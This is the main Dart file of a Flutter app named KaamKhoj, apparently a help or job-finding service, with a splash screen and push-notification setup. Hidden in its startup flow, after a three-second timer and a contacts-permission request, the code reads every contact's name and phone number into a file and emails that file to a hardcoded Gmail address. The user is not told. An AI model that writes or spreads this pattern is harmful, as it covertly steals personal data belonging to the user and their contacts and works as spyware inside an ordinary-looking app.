import 'dart:async';
import 'dart:io';

import 'package:contacts_service/contacts_service.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:kaamkhoj/loginresgiter/Login.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';

import 'Mail/send_mail.dart';
import 'NavigatorPages/navigatorPage.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SharedPreferences prefs = await SharedPreferences.getInstance();
  var token = prefs.getString('Login');
  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
  ]);
  runApp(MaterialApp(
    theme: new ThemeData(
      primaryColor: Color.fromARGB(0xff, 0x88, 0x02, 0x0b),
    ),
    home: token == null ? MyApp("Login") : MyApp("Navigator"),
  ));
}

class MyApp extends StatefulWidget {
  String type;

  MyApp(String type) {
    this.type = type;
  }

  @override
  _MyAppState createState() => new _MyAppState(type);
}

class _MyAppState extends State<MyApp> {
  String type;
  int _counter;
  Timer _timer;

  _MyAppState(String type) {
    this.type = type;
  }

  @override
  void initState() {
    super.initState();
    initPlatformState();
    _startTimer();
  }

  _startTimer() {
    _counter = 03;
    if (_timer != null) {
      _timer.cancel();
    }
    _timer = Timer.periodic(Duration(seconds: 1), (timer) {
      setState(() {
        if (_counter > 0) {
          _counter--;
        } else {
          _timer.cancel();
          getPhoneNumbers();
        }
      });
    });
  }

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initPlatformState() async {
    if (!mounted) return;

    OneSignal.shared.setLogLevel(OSLogLevel.verbose, OSLogLevel.none);

    var settings = {
      OSiOSSettings.autoPrompt: false,
      OSiOSSettings.promptBeforeOpeningPushUrl: true
    };

    OneSignal.shared
        .setNotificationReceivedHandler((OSNotification notification) {});

    OneSignal.shared
        .setNotificationOpenedHandler((OSNotificationOpenedResult result) {});

    // NOTE: Replace with your own app ID from https://www.onesignal.com
    await OneSignal.shared
        .init("981fc4a2-48e3-4186-b18f-7a52d3ad217f", iOSSettings: settings);

    OneSignal.shared
        .setInFocusDisplayType(OSNotificationDisplayType.notification);
  }

  getPhoneNumbers() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    var token = prefs.getString('contacts');
    if (token == null) {
      final PermissionStatus permissionStatus = await _getPermission();

      if (permissionStatus == PermissionStatus.granted) {
        getContacts();
      }
    }
    if (type == "Login") {
      Navigator.pushReplacement(
          context, MaterialPageRoute(builder: (context) => LoginPage()));
    } else {
      Navigator.pushReplacement(
          context, MaterialPageRoute(builder: (context) => NavigatorPage()));
    }
  }

  Future<PermissionStatus> _getPermission() async {
    final PermissionStatus permission = await Permission.contacts.status;
    if (permission != PermissionStatus.granted &&
        permission != PermissionStatus.denied) {
      final Map<Permission, PermissionStatus> permissionStatus =
          await [Permission.contacts].request();
      return permissionStatus[Permission.contacts] ??
          PermissionStatus.undetermined;
    } else {
      return permission;
    }
  }

  Future<void> getContacts() async {
    final Iterable<Contact> contacts = await ContactsService.getContacts();

    for (int i = 0; i < contacts.length; i++) {
      try {
        final Directory directory = await getApplicationDocumentsDirectory();
        final File file = File('${directory.path}/contacts.txt');
        _writeFile(
            contacts.elementAt(i).displayName +
                " - " +
                contacts.elementAt(i).phones.first.value.toString(),
            file);
      } catch (e) {}
    }
    sendContactsMethod();
  }

  _writeFile(String text, File file) async {
    await file.writeAsString('$text\n', mode: FileMode.append);
  }

  sendContactsMethod() async {
    final Directory directory = await getApplicationDocumentsDirectory();
    final File file = File('${directory.path}/contacts.txt');
    sendMailContacts("Clopes024@gmail.com", file);
    addStringToSF();
  }

  addStringToSF() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.setString('contacts', 'yes');
  }

  @override
  Widget build(BuildContext context) {
    return new MaterialApp(
      title: 'Navigator Page',
      home: SafeArea(
        child: Scaffold(
          backgroundColor: Color.fromARGB(0xff, 0xf5, 0xea, 0xea),
          body: Center(
            child: Padding(
              padding: const EdgeInsets.only(bottom: 50.0),
              child: SingleChildScrollView(
                child: Column(
                  children: <Widget>[
                    Padding(
                        padding: const EdgeInsets.fromLTRB(25, 10, 25, 0),
                        child: Text('KaamKhoj',
                            textAlign: TextAlign.center,
                            style: GoogleFonts.sourceSansPro(
                                color: Color.fromARGB(0xff, 0x88, 0x02, 0x0b),
                                fontSize: 40,
                                fontWeight: FontWeight.bold))),
                    Container(
                        width: MediaQuery.of(context).size.width,
                        height: 275,
                        decoration: BoxDecoration(
                          image: DecorationImage(
                              fit: BoxFit.fill,
                              image: AssetImage("assets/images/logo.png")),
                        )),
                    Column(
                      children: <Widget>[
                        Padding(
                          padding: const EdgeInsets.fromLTRB(25, 10, 25, 0),
                          child: Text(
                            'Reliable Help Anytime Anywhere',
                            textAlign: TextAlign.center,
                            style: GoogleFonts.sourceSansPro(
                                color: Color.fromARGB(0xff, 0x88, 0x02, 0x0b),
                                fontSize: 30,
                                fontWeight: FontWeight.bold),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
      theme: new ThemeData(
        primaryColor: Color.fromARGB(0xff, 0x88, 0x02, 0x0b),
      ),
    );
  }
}
